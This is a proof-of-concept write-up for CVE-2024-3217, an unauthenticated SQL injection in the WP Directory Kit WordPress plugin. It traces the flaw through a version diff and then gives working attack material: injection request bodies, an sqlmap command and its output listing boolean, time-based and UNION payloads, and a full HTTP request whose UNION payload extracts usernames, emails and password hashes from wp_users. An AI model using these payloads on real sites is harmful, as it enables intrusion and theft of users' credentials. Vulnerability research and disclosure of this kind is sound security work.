# CVE-2024-3217-POC

# Mitre Description 

The WP Directory Kit plugin for WordPress is vulnerable to SQL Injection via the 'attribute_value' and 'attribute_id' parameters in all versions up to, and including, 1.3.0 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for authenticated attackers, with subscriber-level access and above, to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.

#analysis
i have installed the right version through wordpress

https://wordpress.org/plugins/wpdirectorykit/

if you want an older version click on Advanced View



![image](https://github.com/BassamAssiri/CVE-2024-3217-POC/assets/59013588/56729ca9-e95e-4fe3-950a-40e2fbbb9df8)


we want to download 1.3.0 and 1.3.1 for diff comparison

https://downloads.wordpress.org/plugin/wpdirectorykit.1.3.0.zip
https://downloads.wordpress.org/plugin/wpdirectorykit.1.3.1.zip

when you diff and search for the values of  'attribute_value' and 'attribute_id' i found in this file 

\wpdirectorykit\application\controllers\Wdk_frontendajax.php
i used an extension called "folder diff" in vs code

![image](https://github.com/BassamAssiri/CVE-2024-3217-POC/assets/59013588/283e14c2-6361-4d28-814a-96812d3b30d5)

we can see in the version of 1.3.0 the function "sanitize_text_field" was used but the problem is not here directly it was mostly down more in this part
![image](https://github.com/BassamAssiri/CVE-2024-3217-POC/assets/59013588/3a0b0573-3dfe-4272-9bd5-ae9b49f4bf34)

we can see that if "$attr_search" is numeric we will control the ```$id_part = "$attr_id=$attr_search OR ";``` which will be used as part of SQL Query and since we cannot use " ' " since it is part of a query we do not need it for escape we can directly include our Injection part to the code

which will be used in here 

![image](https://github.com/BassamAssiri/CVE-2024-3217-POC/assets/59013588/909547e5-e718-40df-b95a-a08046fe0f61)

now we need to create a request that will reach these parts and to put a numeric value for "$attr_search" then do our injection and depending on the description it seems like the minimum is  "subscriber-level" we will check for that later
![image](https://github.com/BassamAssiri/CVE-2024-3217-POC/assets/59013588/ca8b6e88-1f68-43d0-ab7f-ac68bc2ec188)


```
offset=0&per_page=10&curr_id=&attribute_id=ID=1)or 1=1-- -&attribute_value=display_name&search_term=1&language_id=&skip_id=&user_check=&sql_where=&hide_fields=&page=wdk_frontendajax&function=treefieldid&action=wdk_public_action&table=user_m&filter_ids=&start_id=&empty_value=Not+Selected
```

```
offset=0&per_page=10&curr_id=&attribute_id=ID=1)*-- -&attribute_value=display_name&search_term=1&language_id=&skip_id=&user_check=&sql_where=&hide_fields=&page=wdk_frontendajax&function=treefieldid&action=wdk_public_action&table=user_m&filter_ids=&start_id=&empty_value=Not+Selected
```


now we will test it with  SQLMAP for PoC 

```
python .\sqlmap.py -r .\sql-wpdirectorykit-4.req --dbs --batch --dbms=mysql --flush-session
```


```

[17:08:36] [INFO] parsing HTTP request from '.\sql-wpdirectorykit-4.req'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
[17:08:36] [INFO] flushing session file
[17:08:36] [INFO] testing connection to the target URL
[17:08:37] [INFO] checking if the target is protected by some kind of WAF/IPS
[17:08:37] [INFO] testing if the target URL content is stable
[17:08:38] [INFO] target URL content is stable
[17:08:38] [INFO] testing if (custom) POST parameter '#1*' is dynamic
[17:08:39] [INFO] (custom) POST parameter '#1*' appears to be dynamic
[17:08:39] [WARNING] heuristic (basic) test shows that (custom) POST parameter '#1*' might not be injectable
[17:08:40] [INFO] testing for SQL injection on (custom) POST parameter '#1*'
[17:08:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:08:44] [INFO] (custom) POST parameter '#1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[17:08:44] [INFO] testing 'Generic inline queries'
[17:08:44] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[17:08:45] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[17:08:45] [WARNING] time-based comparison requires larger statistical model, please wait.................... (done)
[17:09:11] [INFO] (custom) POST parameter '#1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[17:09:11] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[17:09:11] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[17:09:13] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[17:09:18] [INFO] target URL appears to have 34 columns in query
[17:09:36] [INFO] (custom) POST parameter '#1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 65 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: offset=0&per_page=10&curr_id=&attribute_id=ID=1) AND 7544=7544-- -&attribute_value=display_name&search_term=1&language_id=&skip_id=&user_check=&sql_where=&hide_fields=&page=wdk_frontendajax&function=treefieldid&action=wdk_public_action&table=user_m&filter_ids=&start_id=&empty_value=Not Selected

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: offset=0&per_page=10&curr_id=&attribute_id=ID=1) AND (SELECT 1253 FROM (SELECT(SLEEP(5)))BUhD)-- -&attribute_value=display_name&search_term=1&language_id=&skip_id=&user_check=&sql_where=&hide_fields=&page=wdk_frontendajax&function=treefieldid&action=wdk_public_action&table=user_m&filter_ids=&start_id=&empty_value=Not Selected

    Type: UNION query
    Title: Generic UNION query (NULL) - 34 columns
    Payload: offset=0&per_page=10&curr_id=&attribute_id=ID=1) UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7171717871,0x645450444e484b6162547547496545685342754f57475a505641526d4373656c6c50454f61444358,0x7171707671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- --- -&attribute_value=display_name&search_term=1&language_id=&skip_id=&user_check=&sql_where=&hide_fields=&page=wdk_frontendajax&function=treefieldid&action=wdk_public_action&table=user_m&filter_ids=&start_id=&empty_value=Not Selected
---
[17:09:36] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.3.29, Apache 2.4.48
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[17:09:37] [INFO] fetching database names
```



now lets attempt to find the least privileges needed lets start with no cookies 0 privileges and build from there from least privileges

![image](https://github.com/BassamAssiri/CVE-2024-3217-POC/assets/59013588/aed4e1a6-4544-4ed5-b960-1a3d9c81fa96)

after deleting the cookies the output still evaluated lets try the payload from sqlmap for confirmation

![image](https://github.com/BassamAssiri/CVE-2024-3217-POC/assets/59013588/fe6a96cd-e9d4-4018-9e8a-934162327688)

it is a Proof Of Concept no need for any cookies at all for such attack lets create simple payload to extract all values from  wp_users

```
POST /wordpress/wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Content-Length: 551
sec-ch-ua: "Chromium";v="123", "Not:A-Brand";v="8"
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/wordpress/wp-admin/admin.php?page=wdk_listing&id=10&is_updated=true
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

offset=0&per_page=10&curr_id=&attribute_id=ID=1) UNION ALL SELECT NULL,NULL,NULL,CONCAT(display_name,0x3a,display_name,0x3a,user_email,0x3a,user_pass),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from wp_users-- -&attribute_value=display_name&search_term=1&language_id=&skip_id=&user_check=&sql_where=&hide_fields=&page=wdk_frontendajax&function=treefieldid&action=wdk_public_action&table=user_m&filter_ids=&start_id=&empty_value=Not Selected
```

the payload part

```
1) UNION ALL SELECT NULL,NULL,NULL,CONCAT(display_name,0x3a,display_name,0x3a,user_email,0x3a,user_pass),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from wp_users-- -
```
note you need to set the "search_term" to any numeric value in this example it is "1" 

![image](https://github.com/BassamAssiri/CVE-2024-3217-POC/assets/59013588/454a89c5-0751-4d3f-b7a2-8554b9891ac8)

full union sql injection fully unauthenticated


